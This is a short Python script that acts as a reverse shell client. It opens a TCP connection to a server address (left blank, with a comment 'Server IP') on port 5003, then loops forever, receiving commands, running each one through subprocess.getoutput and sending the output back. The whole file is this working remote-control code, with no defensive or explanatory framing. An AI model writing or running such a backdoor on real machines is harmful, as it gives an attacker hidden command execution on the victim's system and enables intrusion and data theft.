import socket
import subprocess

SERVER_HOST = "" # Server IP
SERVER_PORT = 5003
BUFFER_SIZE = 1024


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((SERVER_HOST, SERVER_PORT))

while True:
    command = s.recv(BUFFER_SIZE).decode()
    
    output = subprocess.getoutput(command)
    s.send(output.encode())
            
